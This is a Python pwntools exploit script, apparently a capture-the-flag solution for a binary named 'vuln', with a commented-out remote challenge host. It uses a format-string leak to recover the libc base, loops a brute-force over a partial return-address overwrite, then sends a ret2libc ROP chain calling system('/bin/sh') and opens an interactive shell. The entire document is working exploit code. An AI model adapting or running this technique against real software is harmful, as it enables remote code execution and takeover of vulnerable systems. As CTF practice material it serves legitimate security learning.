from pwn import *

elf = ELF("./vuln", checksec=False)
libc = elf.libc
packu = make_packer('all')

x = 0x0
while True:

    p = process(elf.path)
    #p = remote("fermat.chal.imaginaryctf.org", 1337)

    p.recvline(timeout=1)

    payload = b"%4$p|"

    payload=  payload.ljust(264, b"A")
    payload += packu(0x42f4d3+x)


    p.send(payload)

    try:
        libc.address = int(p.recvuntil(b'|', drop=True),16) - 2207504
    except:
        x += 0x1000
        continue
    info("libc @0x%hx" % libc.address)

    #0x000000000002a3e5 : pop rdi ; ret



    print(p.recv())



    payload = b"A"*264
    payload += p64(libc.address + 0x000000000002a3e5)
    payload += p64(next(libc.search(b"/bin/sh\0")))
    payload += p64(libc.address + 0x0000000000029cd6)
    payload += p64(libc.sym["system"])
    x += 0x1000
    print("Trying: @0x%hx" % x)
    if x > 0x1000000:
        x = 0
    try:
        p.sendline(payload)
        p.clean()

        p.sendline(b"echo uwu")
        if b"uwu" in p.recvline():
            print("Working")
            p.interactive()
    except:
        p.close()
        continue

